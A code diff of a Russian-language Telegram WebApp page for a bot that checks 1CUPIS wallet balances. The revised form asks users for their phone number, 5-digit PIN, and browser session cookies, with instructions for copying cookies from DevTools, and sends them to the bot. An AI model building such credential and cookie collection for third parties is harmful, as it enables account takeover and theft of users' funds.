@@ -8,33 +8,65 @@
   <style>
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
     .container { max-width: 400px; margin: 0 auto; background: white; border-radius: 16px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-    h2 { text-align: center; color: #1a1a1a; }
+    h2 { text-align: center; color: #1a1a1a; margin-bottom: 20px; }
     .step { margin: 20px 0; padding: 15px; background: #f0f8ff; border-radius: 12px; }
-    button { width: 100%; padding: 14px; background: #007AFF; color: white; border: none; border-radius: 12px; font-size: 16px; margin-top: 10px; }
-    .info { font-size: 14px; color: #666; text-align: center; margin-top: 15px; }
+    .step h3 { margin-top: 0; color: #007AFF; }
+    button { width: 100%; padding: 14px; background: #007AFF; color: white; border: none; border-radius: 12px; font-size: 16px; margin-top: 10px; cursor: pointer; }
+    button:hover { background: #0051D5; }
+    button.secondary { background: #34C759; }
+    button.secondary:hover { background: #28A745; }
+    input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; margin-top: 8px; }
+    .info { font-size: 14px; color: #666; text-align: center; margin-top: 15px; line-height: 1.5; }
+    .instructions { font-size: 13px; color: #888; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 8px; }
+    .instructions ol { margin: 8px 0; padding-left: 20px; }
+    .instructions li { margin: 5px 0; }
+    .cookie-input { width: 100%; min-height: 80px; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; font-family: monospace; box-sizing: border-box; margin-top: 8px; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>1CUPIS Wallet</h2>
+    <h2>🔐 1CUPIS Авторизация</h2>
 
     <div class="step" id="step1">
-      <p>1. Войдите в аккаунт вручную</p>
-      <iframe src="https://wallet.1cupis.ru/" style="width:100%; height:500px; border:none; border-radius:12px;"></iframe>
+      <h3>Шаг 1: Авторизуйтесь на сайте</h3>
+      <p>Нажмите кнопку ниже, чтобы открыть сайт 1CUPIS для входа в аккаунт.</p>
+      <button class="secondary" onclick="openLoginPage()">🌐 Открыть 1CUPIS</button>
+      <div class="instructions">
+        <strong>После авторизации:</strong>
+        <ol>
+          <li>Войдите в аккаунт на открывшейся странице</li>
+          <li>Вернитесь в это окно</li>
+          <li>Заполните форму ниже</li>
+        </ol>
+      </div>
     </div>
 
-    <div class="step" id="step2" style="display:none;">
-      <p>2. Введите ваш <strong>номер телефона</strong> (10 цифр):</p>
-      <input type="tel" id="phone" placeholder="9123456789" maxlength="10" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; font-size:16px;">
+    <div class="step" id="step2">
+      <h3>Шаг 2: Введите данные</h3>
+
+      <label>
+        <strong>Номер телефона</strong> (10 цифр):
+        <input type="tel" id="phone" placeholder="9123456789" maxlength="10" pattern="[0-9]{10}">
+      </label>
+
+      <label style="display: block; margin-top: 15px;">
+        <strong>PIN-код</strong> (5 цифр):
+        <input type="text" id="pin" placeholder="18342" maxlength="5" pattern="[0-9]{5}">
+      </label>
+
+      <label style="display: block; margin-top: 15px;">
+        <strong>Cookies</strong> (опционально, скопируйте из браузера):
+        <textarea id="cookies" class="cookie-input" placeholder='session_id=xxx; auth_token=yyy; ... (или оставьте пустым)'></textarea>
+      </label>
+      <div class="info" style="font-size: 12px; margin-top: 5px;">
+        💡 Cookies можно скопировать из DevTools браузера (F12 → Application → Cookies)
+      </div>
     </div>
 
-    <div class="step" id="step3" style="display:none;">
-      <p>3. Введите <strong>PIN-код</strong> (5 цифр):</p>
-      <input type="text" id="pin" placeholder="18342" maxlength="5" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; font-size:16px;">
+    <button onclick="saveAuth()">✅ Сохранить вход</button>
+    <div class="info">
+      Мы сохраним ваши данные для быстрого доступа к балансу через команду /balance
     </div>
-
-    <button onclick="saveAuth()">Сохранить вход</button>
-    <div class="info">Мы сохраним сессию и PIN. Вы сможете проверять баланс в боте.</div>
   </div>
 
   <script>
@@ -42,35 +74,46 @@
     tg.ready();
     tg.expand();
 
-    let step = 1;
-    const iframe = document.querySelector('iframe');
-
-    // Ждём, пока пользователь войдёт
-    setTimeout(() => {
-      document.getElementById('step1').style.display = 'none';
-      document.getElementById('step2').style.display = 'block';
-    }, 30000); // 30 сек на вход
+    function openLoginPage() {
+      // Открываем страницу авторизации напрямую в браузере Telegram
+      tg.openLink('https://wallet.1cupis.ru/');
+    }
 
     function saveAuth() {
-      const phone = document.getElementById('phone').value;
-      const pin = document.getElementById('pin').value;
+      const phone = document.getElementById('phone').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+      const cookies = document.getElementById('cookies').value.trim();
 
-      if (!phone || phone.length !== 10 || !pin || pin.length !== 5) {
-        alert("Проверьте номер и PIN");
+      // Валидация
+      if (!phone || phone.length !== 10 || !/^\d{10}$/.test(phone)) {
+        alert("❌ Проверьте номер телефона:\n- Должно быть ровно 10 цифр\n- Пример: 9123456789");
         return;
       }
 
-      const cookies = document.cookie;
+      if (!pin || pin.length !== 5 || !/^\d{5}$/.test(pin)) {
+        alert("❌ Проверьте PIN-код:\n- Должно быть ровно 5 цифр\n- Пример: 18342");
+        return;
+      }
+
+      // Формируем данные для отправки
       const sessionData = {
         action: 'save_auth',
         phone: phone,
         pin: pin,
-        cookies: cookies,
+        cookies: cookies || '', // Может быть пустым, если не удалось получить
         url: location.href
       };
 
+      // Отправляем данные в бота
       tg.sendData(JSON.stringify(sessionData));
-      tg.close();
+
+      // Показываем сообщение об успехе
+      tg.showAlert('✅ Данные сохранены! Вернитесь в бот и используйте /balance');
+
+      // Закрываем веб-апп
+      setTimeout(() => {
+        tg.close();
+      }, 1500);
     }
   </script>
 </body>
